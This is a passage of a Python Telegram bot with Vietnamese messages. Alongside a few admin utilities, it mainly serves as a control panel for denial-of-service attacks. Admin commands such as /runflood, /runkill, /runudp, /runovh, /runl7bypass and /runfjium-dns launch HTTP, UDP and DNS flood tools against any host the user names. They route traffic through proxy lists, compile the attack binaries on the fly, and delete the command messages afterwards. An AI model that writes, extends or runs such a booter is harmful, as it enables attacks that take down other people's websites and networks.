        admin_session_cache.discard(target)
        sent = bot.reply_to(message, f"✅ Đã cấm user {target}")
    else:
        sent = bot.reply_to(message, "❌ Lỗi khi cấm user")
    auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['unban'])
@ignore_old_messages
@not_banned
@admin_required
def cmd_unban(message):
    delete_message_immediately(message.chat.id, message.message_id)
    args = message.text.strip().split()
    if len(args) != 2:
        sent = bot.reply_to(message, "⚠️ Cách dùng: /unban <user_id>")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    try:
        target = int(args[1])
    except ValueError:
        sent = bot.reply_to(message, "❌ User ID phải là số!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    if db.unban_user(target):
        sent = bot.reply_to(message, f"✅ Đã gỡ cấm user {target}")
    else:
        sent = bot.reply_to(message, "❌ Lỗi khi gỡ cấm")
    auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['setadminpass'])
@ignore_old_messages
@not_banned
@admin_required
def cmd_setadminpass(message):
    delete_message_immediately(message.chat.id, message.message_id)
    args = message.text.split(maxsplit=1)
    if len(args) != 2 or not args[1].strip():
        sent = bot.reply_to(message, "⚠️ Cách dùng: /setadminpass <new_password>")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    new_pass = args[1].strip()
    if db.set_setting('admin_password', new_pass):
        sent = bot.reply_to(message, "✅ Đã cập nhật mật khẩu admin!")
    else:
        sent = bot.reply_to(message, "❌ Không thể cập nhật mật khẩu!")
    auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['setwelcome'])
@ignore_old_messages
@not_banned
@admin_required
def cmd_setwelcome(message):
    delete_message_immediately(message.chat.id, message.message_id)
    args = message.text.split(maxsplit=1)
    if len(args) != 2 or not args[1].strip():
        sent = bot.reply_to(message, "⚠️ Cách dùng: /setwelcome <text>")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    text = args[1]
    if db.set_setting('welcome_message', text):
        sent = bot.reply_to(message, "✅ Đã cập nhật lời chào!")
    else:
        sent = bot.reply_to(message, "❌ Không thể cập nhật lời chào!")
    auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['maintenance'])
@ignore_old_messages
@not_banned
@admin_required
def cmd_maintenance(message):
    delete_message_immediately(message.chat.id, message.message_id)
    args = message.text.strip().split()
    if len(args) != 2 or args[1].lower() not in ("on", "off"):
        sent = bot.reply_to(message, "⚠️ Cách dùng: /maintenance <on|off>")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    flag = '1' if args[1].lower() == 'on' else '0'
    if db.set_setting('maintenance_mode', flag):
        sent = bot.reply_to(message, f"✅ Maintenance {'ON' if flag=='1' else 'OFF'}")
    else:
        sent = bot.reply_to(message, "❌ Không thể cập nhật maintenance mode!")
    auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['myid'])
@ignore_old_messages
@not_banned
def cmd_myid(message):
    sent = bot.reply_to(message, f"🆔 **ID của bạn:** `{message.from_user.id}`\n👤 **Username:** @{message.from_user.username or 'Không có'}", parse_mode='Markdown')
    auto_delete_response(message.chat.id, message.message_id, sent, delay=15)
    logger.info(f"User {message.from_user.id} requested their ID")

@bot.message_handler(commands=['stats'])
@ignore_old_messages
@not_banned
def cmd_stats(message):
    try:
        with db.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM users')
            total_users = cursor.fetchone()[0]
            cursor.execute('SELECT COUNT(*) FROM users WHERE is_admin=1')
            total_admins = cursor.fetchone()[0]
            cursor.execute('SELECT COUNT(*) FROM activity_logs WHERE date(timestamp) = date("now")')
            today_activities = cursor.fetchone()[0]
        uptime = get_uptime()
        stats_msg = (
            f"📊 **THỐNG KÊ BOT**\n"
            f"👥 Tổng users: {total_users}\n"
            f"👑 Admins: {total_admins}\n"
            f"📈 Hoạt động hôm nay: {today_activities}\n"
            f"⏰ Uptime: {uptime}"
        )
        sent = bot.send_message(message.chat.id, stats_msg, parse_mode='Markdown')
        auto_delete_response(message.chat.id, message.message_id, sent, delay=20)
        logger.info(f"User {message.from_user.id} requested stats")
    except Exception as e:
        logger.error(f"Error in /stats: {e}")
        sent = bot.reply_to(message, "❌ Không thể lấy thống kê!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['runkill'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_runkill(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runkill...")
        
        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)
        
        args = message.text.split()
        if len(args) < 5 or len(args) > 6:
            bot.edit_message_text(
                "⚠️ Cách dùng: /runkill target time rate threads [proxyfile]\n"
                "Ví dụ: /runkill https://example.com 60 100 4 proxies.txt\n"
                "Nếu không nhập proxyfile, bot sẽ tự động tìm file proxies.txt",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return
        target = args[1]
        duration = args[2]
        rate = args[3]
        threads = args[4]
        if len(args) == 6:
            proxyfile = args[5]
            if not os.path.isfile(proxyfile):
                bot.edit_message_text(f"❌ File proxy không tồn tại: {proxyfile}", 
                                    chat_id=message.chat.id, 
                                    message_id=processing_msg.message_id)
                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
                return
        else:
            # Tự động tìm file proxy phổ biến
            possible_files = ['proxies.txt', 'proxy.txt', 'proxies.lst']
            proxyfile = None
            for f in possible_files:
                if os.path.isfile(f):
                    proxyfile = f
                    break
            if proxyfile is None:
                bot.edit_message_text(
                    "❌ Không tìm thấy file proxy mặc định (proxies.txt). "
                    "Vui lòng cung cấp tên file proxy hoặc thêm file proxies.txt vào thư mục bot.",
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id
                )
                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
                return
        cmd = ['node', 'kill.js', target, duration, rate, threads, proxyfile]
        logger.info(f"Running kill.js with args: {cmd}")
        
        # Cập nhật thông báo thành công
        bot.edit_message_text(
            f"✅ Lệnh /runkill đã được nhận!\n"
            f"🎯 Target: {target}\n"
            f"⏱️ Thời gian: {duration}s\n"
            f"📊 Rate: {rate}\n"
            f"🧵 Threads: {threads}\n"
            f"📁 Proxy: {proxyfile}\n\n"
            f"🔄 Đang khởi động tác vụ...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'killjs', message)
    except Exception as e:
        logger.error(f"Error /runkill: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runkill: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except Exception:
            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runkill: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['runudp'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_runudp(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runudp...")
        
        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)
        
        args = message.text.split()
        if len(args) != 4:
            bot.edit_message_text(
                "⚠️ Cách dùng: /runudp host port method\n"
                "Phương thức: flood, nuke, mix, storm, pulse, random\n"
                "Ví dụ: /runudp 1.2.3.4 80 flood",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return
        _, host, port, method = args
        method = method.lower()
        if method not in ['flood', 'nuke', 'mix', 'storm', 'pulse', 'random']:
            bot.edit_message_text(
                "❌ Phương thức không hợp lệ. Chọn một trong: flood, nuke, mix, storm, pulse, random",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            return
        
        # Use different approach for Windows vs Unix
        if os.name == 'nt':  # Windows
            cmd = ['python', 'udp_improved.py', host, port, method]
        else:  # Unix/Linux
            cmd = ['python3', 'udp_improved.py', host, port, method]
        
        # Cập nhật thông báo thành công
        bot.edit_message_text(
            f"✅ Lệnh /runudp đã được nhận!\n"
            f"🎯 Host: {host}\n"
            f"🔌 Port: {port}\n"
            f"⚡ Method: {method}\n\n"
            f"🔄 Đang khởi động tác vụ...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'udp', message)
    except Exception as e:
        logger.error(f"Error /runudp: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runudp: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except Exception:
            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runudp: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)


@bot.message_handler(commands=['runudpbypass'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_runudpbypass(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runudpbypass...")
        
        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)
        
        args = message.text.split()
        if len(args) < 4 or len(args) > 6:
            bot.edit_message_text(
                "⚠️ Cách dùng: /runudpbypass <ip> <port> <duration> [packet_size=1472] [burst=1024]\n"
                "Ví dụ: /runudpbypass 1.2.3.4 80 60\n"
                "Ví dụ: /runudpbypass 1.2.3.4 80 60 1024 512",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        ip = args[1]
        port = args[2]
        duration = args[3]
        packet_size = args[4] if len(args) > 4 else "1472"
        burst_size = args[5] if len(args) > 5 else "1024"

        # Kiểm tra nếu file udpbypass chưa được compile
        if not os.path.isfile('udpbypass') and not os.path.isfile('udpbypass.exe'):
            if os.name == 'nt':  # Windows
                bot.edit_message_text(
                    "⚠️ File udpbypass.exe không tồn tại. Vui lòng compile udpbypass.c trước.",
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id
                )
                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
                return
            else:  # Unix/Linux
                compile_cmd = ['gcc', '-o', 'udpbypass', 'udpbypass.c', '-pthread']
                bot.edit_message_text(
                    "🔧 Đang compile udpbypass.c ...",
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id
                )
                compile_proc = subprocess.run(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if compile_proc.returncode != 0:
                    bot.edit_message_text(
                        f"❌ Lỗi compile udpbypass.c:\n{compile_proc.stderr.decode(errors='ignore')}",
                        chat_id=message.chat.id,
                        message_id=processing_msg.message_id
                    )
                    auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
                    return

        # Use different approach for Windows vs Unix
        if os.name == 'nt':  # Windows
            cmd = ['udpbypass.exe', ip, port, duration, packet_size, burst_size]
        else:  # Unix/Linux
            cmd = ['./udpbypass', ip, port, duration, packet_size, burst_size]
        
        # Cập nhật thông báo thành công
        bot.edit_message_text(
            f"✅ Lệnh /runudpbypass đã được nhận!\n"
            f"🎯 IP: {ip}\n"
            f"🔌 Port: {port}\n"
            f"⏱️ Duration: {duration}s\n"
            f"📦 Packet Size: {packet_size}\n"
            f"💥 Burst Size: {burst_size}\n\n"
            f"🔄 Đang khởi động tác vụ...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'udpbypass', message)
    except Exception as e:
        logger.error(f"Error /runudpbypass: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runudpbypass: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except Exception:
            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runudpbypass: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)


@bot.message_handler(commands=['runovh'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_runovh(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runovh...")
        
        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)
        
        args = message.text.split()
        if len(args) != 5:
            bot.edit_message_text(
                "⚠️ Cách dùng: /runovh host port duration threads\n"
                "Ví dụ: /runovh 1.2.3.4 80 60 8",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        _, host, port, duration, threads = args

        if not os.path.isfile('udpovh2gb') and not os.path.isfile('udpovh2gb.exe'):
            if os.name == 'nt':  # Windows
                bot.edit_message_text(
                    "⚠️ udpovh2gb.exe không tồn tại. Vui lòng compile udpovh2gb.c trên Windows hoặc cung cấp file .exe.",
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id
                )
                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
                return
            else:  # Unix/Linux
                compile_cmd = ['gcc', 'udpovh2gb.c', '-o', 'udpovh2gb', '-lpthread']
                bot.edit_message_text(
                    "🔧 Đang compile udpovh2gb.c ...",
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id
                )
                compile_proc = subprocess.run(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if compile_proc.returncode != 0:
                    bot.edit_message_text(
                        f"❌ Lỗi compile udpovh2gb.c:\n{compile_proc.stderr.decode(errors='ignore')}",
                        chat_id=message.chat.id,
                        message_id=processing_msg.message_id
                    )
                    auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
                    return

        # Use different approach for Windows vs Unix
        if os.name == 'nt':  # Windows
            cmd = ['udpovh2gb.exe', host, port, duration, threads]  # Windows executable
        else:  # Unix/Linux
            cmd = ['./udpovh2gb', host, port, duration, threads]
        
        # Cập nhật thông báo thành công
        bot.edit_message_text(
            f"✅ Lệnh /runovh đã được nhận!\n"
            f"🎯 Host: {host}\n"
            f"🔌 Port: {port}\n"
            f"⏱️ Duration: {duration}s\n"
            f"🧵 Threads: {threads}\n\n"
            f"🔄 Đang khởi động tác vụ...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )
        
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'udpovh', message)
    except Exception as e:
        logger.error(f"Error /runovh: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi khi xử lý lệnh /runovh: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except Exception:
            sent = bot.reply_to(message, f"❌ Có lỗi khi xử lý lệnh /runovh: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['runflood'])
@ignore_old_messages
@not_banned
@admin_required
@log_command
def cmd_runflood(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runflood...")

        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)

        # Phân tích tham số từ lệnh
        args = message.text.split()[1:]  # Bỏ qua tên lệnh
        if len(args) < 4:
            bot.edit_message_text(
                "❌ **Cú pháp flood nâng cao:**\n"
                "`/runflood <host> <time> <threads> <rate> [method] [proxyfile] [options]`\n\n"
                "**Tham số bắt buộc:**\n"
                "• `host` - Target URL\n"
                "• `time` - Thời gian (giây)\n"
                "• `threads` - Số luồng\n"
                "• `rate` - Tốc độ request/s\n\n"
                "**Tham số tùy chọn:**\n"
                "• `method` - GET/POST (mặc định: GET)\n"
                "• `proxyfile` - File proxy (mặc định: auto-detect)\n"
                "• `--query <value>` - Query parameter (mặc định: 1)\n"
                "• `--cookie \"<cookie>\"` - Cookie header (mặc định: uh=good)\n"
                "• `--http <version>` - HTTP version 1/2 (mặc định: 2)\n"
                "• `--debug` - Bật debug mode\n"
                "• `--full` - Full attack mode\n"
                "• `--winter` - Winter mode\n\n"
                "**Ví dụ:**\n"
                "`/runflood example.com 60 10 1000`\n"
                "`/runflood example.com 60 10 1000 POST proxy.txt --query 5 --cookie \"session=abc\" --http 2 --debug --full`",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id,
                parse_mode='Markdown'
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=30)
            return

        host = args[0]
        time = args[1]
        threads = args[2]
        rate = args[3]

        # Parse optional parameters
        method = 'GET'  # Default method
        proxyfile = None  # Will auto-detect
        query_value = '1'  # Default query
        cookie_value = 'uh=good'  # Default cookie
        http_version = '2'  # Default HTTP version
        debug_mode = False
        full_mode = False
        winter_mode = False

        # Parse remaining arguments
        i = 4
        while i < len(args):
            arg = args[i]

            if arg.upper() in ['GET', 'POST']:
                method = arg.upper()
            elif arg.endswith('.txt') or arg.endswith('.list') or arg.endswith('.lst'):
                proxyfile = arg
            elif arg == '--query' and i + 1 < len(args):
                query_value = args[i + 1]
                i += 1
            elif arg == '--cookie' and i + 1 < len(args):
                cookie_value = args[i + 1].strip('"\'')  # Remove quotes
                i += 1
            elif arg == '--http' and i + 1 < len(args):
                http_version = args[i + 1]
                i += 1
            elif arg == '--debug':
                debug_mode = True
            elif arg == '--full':
                full_mode = True
            elif arg == '--winter':
                winter_mode = True

            i += 1

        # Auto-detect proxy file if not specified
        if proxyfile is None:
            possible_files = ['proxies.txt', 'proxy.txt', 'proxies.lst']
            for f in possible_files:
                if os.path.isfile(f):
                    proxyfile = f
                    break

        # Nếu không tìm thấy file proxy nào
        if proxyfile is None:
            bot.edit_message_text(
                "❌ Không tìm thấy file proxy (proxies.txt, proxy.txt, proxies.lst). Vui lòng cung cấp file proxy hợp lệ.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        # Kiểm tra file proxy tồn tại
        if not os.path.isfile(proxyfile):
            bot.edit_message_text(
                f"❌ File proxy '{proxyfile}' không tồn tại!",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        # Kiểm tra file flood.js
        if not os.path.isfile('flood.js'):
            bot.edit_message_text(
                "❌ File 'flood.js' không tồn tại!",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        # Tạo thông báo chi tiết
        options_text = []
        if query_value != '1':
            options_text.append(f"Query: {query_value}")
        if cookie_value != 'uh=good':
            options_text.append(f"Cookie: {cookie_value}")
        if http_version != '2':
            options_text.append(f"HTTP: {http_version}")
        if debug_mode:
            options_text.append("Debug: ON")
        if full_mode:
            options_text.append("Full: ON")
        if winter_mode:
            options_text.append("Winter: ON")

        options_str = f"\n🔧 **Options:** {', '.join(options_text)}" if options_text else ""

        # Cập nhật thông báo
        bot.edit_message_text(
            f"🚀 **Đang khởi động flood attack...**\n"
            f"🎯 **Target:** `{host}`\n"
            f"⏱️ **Time:** {time}s\n"
            f"🧵 **Threads:** {threads}\n"
            f"📊 **Rate:** {rate}/s\n"
            f"🌐 **Method:** {method}\n"
            f"📁 **Proxy:** {proxyfile}{options_str}",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            parse_mode='Markdown'
        )

        # Xây dựng command với các tham số
        cmd = ['node', 'flood.js', method, host, time, threads, rate, proxyfile]

        # Thêm các options
        cmd.extend(['--query', query_value])
        cmd.extend(['--cookie', cookie_value])
        cmd.extend(['--http', http_version])

        if debug_mode:
            cmd.append('--debug')
        if full_mode:
            cmd.append('--full')
        if winter_mode:
            cmd.append('--winter')

        logger.info(f"Đang chạy flood.js với các tham số: {cmd}")

        # Tự động xóa thông báo khởi động sau 10 giây
        auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)

        # Chạy script flood.js bất đồng bộ
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'flood', message)

        # Log hoạt động
        db.log_activity(
            message.from_user.id,
            "RUN_FLOOD",
            f"host={host}, time={time}, threads={threads}, rate={rate}, method={method}, proxy={proxyfile}, options={options_text}"
        )

    except Exception as e:
        logger.error(f"Đã xảy ra lỗi trong /runflood: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runflood: {str(e)}",
                                chat_id=message.chat.id,
                                message_id=processing_msg.message_id)
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
        except Exception:
            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runflood: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['runl7bypass'])
@ignore_old_messages
@not_banned
@admin_required
@resource_limit
@log_command
def cmd_runl7bypass(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runl7bypass...")
        
        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)
        
        # Phân tích tham số từ lệnh
        args = message.text.split()
        if len(args) < 5 or len(args) > 6:
            bot.edit_message_text(
                "⚠️ Cách dùng: /runl7bypass <host> <time> <rps> <threads> [proxyfile]\n"
                "Ví dụ: /runl7bypass https://example.com 60 100 4\n"
                "Ví dụ: /runl7bypass https://example.com 60 100 4 proxies.txt\n"
                "Nếu không nhập proxyfile, bot sẽ tự động tìm file proxies.txt",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        host = args[1]
        time = args[2]
        rps = args[3]
        threads = args[4]
        
        # Xử lý proxyfile
        if len(args) == 6:
            proxyfile = args[5]
            if not os.path.isfile(proxyfile):
                bot.edit_message_text(
                    f"❌ File proxy không tồn tại: {proxyfile}",
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id
                )
                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
                return
        else:
            # Tự động tìm file proxy phổ biến
            possible_files = ['proxies.txt', 'proxy.txt', 'proxies.lst']
            proxyfile = None
            for f in possible_files:
                if os.path.isfile(f):
                    proxyfile = f
                    break
            if proxyfile is None:
                bot.edit_message_text(
                    "❌ Không tìm thấy file proxy mặc định (proxies.txt, proxy.txt, proxies.lst). "
                    "Vui lòng cung cấp tên file proxy hoặc thêm file proxies.txt vào thư mục bot.",
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id
                )
                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
                return

        # Tạo lệnh chạy bypass.js
        cmd = ['node', 'bypass.js', host, time, rps, threads, proxyfile]
        logger.info(f"Đang chạy bypass.js với các tham số: {cmd}")

        # Cập nhật thông báo thành công
        bot.edit_message_text(
            f"✅ Lệnh /runl7bypass đã được nhận!\n"
            f"🎯 Host: {host}\n"
            f"⏱️ Time: {time}s\n"
            f"📊 RPS: {rps}\n"
            f"🧵 Threads: {threads}\n"
            f"📁 Proxy: {proxyfile}\n\n"
            f"🔄 Đang khởi động tác vụ bypass...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )

        # Chạy script bypass.js bất đồng bộ
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'l7bypass', message)

    except Exception as e:
        logger.error(f"Đã xảy ra lỗi trong /runl7bypass: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runl7bypass: {str(e)}", 
                                chat_id=message.chat.id, 
                                message_id=processing_msg.message_id)
        except Exception:
            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runl7bypass: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['runfjium-dns'])
@ignore_old_messages
@not_banned
@admin_required
@resource_limit
@log_command
def cmd_runfjium_dns(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runfjium-dns...")

        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)

        # Phân tích tham số từ lệnh
        args = message.text.split()
        if len(args) < 4 or len(args) > 5:
            bot.edit_message_text(
                "⚠️ Cách dùng: /runfjium-dns <target> <port> <time> [threads]\n"
                "Ví dụ: /runfjium-dns example.com 53 60\n"
                "Ví dụ: /runfjium-dns example.com 53 60 100\n"
                "📋 Tham số:\n"
                "• target: Domain hoặc IP target\n"
                "• port: Port DNS (thường là 53)\n"
                "• time: Thời gian tấn công (giây)\n"
                "• threads: Số luồng (mặc định: 100)",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        target = args[1]
        port = args[2]
        time = args[3]
        threads = args[4] if len(args) > 4 else "100"

        # Kiểm tra tính hợp lệ của tham số
        try:
            port_int = int(port)
            time_int = int(time)
            threads_int = int(threads)
            if port_int <= 0 or port_int > 65535:
                raise ValueError("Port phải từ 1-65535")
            if time_int <= 0 or time_int > 3600:
                raise ValueError("Time phải từ 1-3600 giây")
            if threads_int <= 0 or threads_int > 1000:
                raise ValueError("Threads phải từ 1-1000")
        except ValueError as ve:
            bot.edit_message_text(f"❌ Tham số không hợp lệ: {ve}",
                                chat_id=message.chat.id,
                                message_id=processing_msg.message_id)
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            return

        # Kiểm tra file fjium-dns
        fjium_dns_path = "fjium-dns"
        if os.name == 'nt':  # Windows
            fjium_dns_path += ".exe"

        if not os.path.exists(fjium_dns_path):
            bot.edit_message_text(
                "❌ File fjium-dns không tồn tại!\n"
                "📥 Vui lòng tải file fjium-dns vào thư mục bot.",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
            return

        # Tự động chmod +x cho file fjium-dns
        try:
            if os.name != 'nt':  # Không phải Windows
                result = subprocess.run(['chmod', '+x', fjium_dns_path],
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    logger.info(f"Đã chmod +x cho {fjium_dns_path}")
                else:
                    logger.warning(f"chmod failed for {fjium_dns_path}: {result.stderr}")
            else:
                logger.info(f"Windows detected, skipping chmod for {fjium_dns_path}")
        except subprocess.TimeoutExpired:
            logger.warning(f"chmod timeout cho {fjium_dns_path}")
        except FileNotFoundError:
            logger.warning(f"chmod command not found")
        except Exception as e:
            logger.warning(f"Không thể chmod +x cho {fjium_dns_path}: {e}")

        # Cập nhật thông báo
        bot.edit_message_text(
            f"✅ Lệnh /runfjium-dns đã được nhận!\n"
            f"🎯 Target: {target}:{port}\n"
            f"⏱️ Thời gian: {time}s\n"
            f"🧵 Threads: {threads}\n"
            f"🔄 Đang khởi động fjium-dns...",
            chat_id=message.chat.id,
            message_id=processing_msg.message_id
        )

        # Tạo lệnh chạy fjium-dns
        if os.name == 'nt':  # Windows
            cmd = [fjium_dns_path, target, port, time, threads]
        else:  # Linux/Unix
            cmd = [f"./{fjium_dns_path}", target, port, time, threads]

        # Chạy subprocess
        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'fjium-dns', message)

    except Exception as e:
        logger.error(f"Error in /runfjium-dns: {e}")
        try:
            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-dns: {str(e)}",
                                chat_id=message.chat.id,
                                message_id=processing_msg.message_id)
        except Exception:
            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-dns: {str(e)}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['runfjium-mix'])
@ignore_old_messages
@not_banned
@admin_required
@resource_limit
@log_command
def cmd_runfjium_mix(message):
    try:
        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runfjium-mix...")

        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
        delete_message_immediately(message.chat.id, message.message_id)

        # Phân tích tham số từ lệnh
        args = message.text.split()
        if len(args) < 4 or len(args) > 5:
            bot.edit_message_text(
                "⚠️ Cách dùng: /runfjium-mix <target> <port> <time> [threads]\n"
                "Ví dụ: /runfjium-mix example.com 80 60\n"
                "Ví dụ: /runfjium-mix example.com 80 60 200\n"
                "📋 Tham số:\n"
                "• target: Domain hoặc IP target\n"
                "• port: Port target\n"
                "• time: Thời gian tấn công (giây)\n"
                "• threads: Số luồng (mặc định: 200)",
                chat_id=message.chat.id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
            return

        target = args[1]
        port = args[2]
        time = args[3]
        threads = args[4] if len(args) > 4 else "200"

        # Kiểm tra tính hợp lệ của tham số
        try:
            port_int = int(port)
            time_int = int(time)
            threads_int = int(threads)
            if port_int <= 0 or port_int > 65535:
                raise ValueError("Port phải từ 1-65535")
            if time_int <= 0 or time_int > 3600:
